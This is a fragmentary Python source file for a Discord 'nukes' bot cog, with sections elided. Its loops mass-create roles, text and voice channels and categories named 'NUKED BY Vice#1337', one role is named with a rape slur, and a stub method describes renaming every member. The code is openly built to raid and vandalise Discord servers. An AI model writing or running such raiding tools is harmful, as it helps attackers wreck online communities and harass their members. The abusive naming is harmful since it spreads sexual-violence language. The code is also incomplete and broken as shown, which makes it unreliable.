...
class nukes(commands.Cog):
        ...
        for i in range(1, 25):
            try:
                await ctx.guild.create_role(
                    name=f"RAPED BY Vice#1337{i}"
                )
                print(
                    f"{Fore.GREEN}[-]ROLE > {Fore.RESET}Made role:  RAPED BY Vice#1337{i}"
                )
            except:
        ...
        for i in range(1, 25):
            try:
                await ctx.guild.create_text_channel(
                    name=f"NUKED-BY-Vice#1337"
                )
                print(
                    f"{Fore.GREEN}[-]CHANNEL > {Fore.RESET}Made text channel:  NUKED-BY-Vice#1337"
                )
                await ctx.guild.create_voice_channel(
                    name=f"NUKED BY Vice#1337"
                )
                print(
                    f"{Fore.GREEN}[-]CHANNEL > {Fore.RESET}Made voice channel:  NUKED BY Vice#1337"
                )
                await ctx.guild.create_category(
                    name=f"NUKED BY Vice#1337"
                )
                print(
                    f"{Fore.RED}[-]CHANNEl > {Fore.RESET}Made category: NUKED BY Vice#1337"
                )
            except:
    ...
    async def execute(self, ctx):
        ...
        for i in range(1, 50):
            try:
                await ctx.guild.create_role(
                    name=f"NUKED BY Vice#1337 {i}"
                )
                print(
                    f"{Fore.RED}[-]ROLE > {Fore.RESET}Made role NUKED BY Vice#1337 {i}"
                )
            except Exception as e:
        ...
        for i in range(1, 25):
            try:
                ...
                print(
                    f"{Fore.RED}[-]CHANNEL > {Fore.RESET}Made text channel! NUKED-BY-Vice#1337"
                )
                await ctx.guild.create_voice_channel(
                    name=f"NUKED BY Vice#1337"
                )
                print(
                    f"{Fore.RED}[-]CHANNEL > {Fore.RESET}Made voice channel! NUKED BY Vice#1337"
                )
                await ctx.guild.create_category(
                    name=f"NUKED BY Vice#1337"
                )
    ...
    async def undoreall(self, ctx):
        """Renames every member in the server to valerie fan"""
        await ctx.delete()
        rename_to = ""
        i = 0
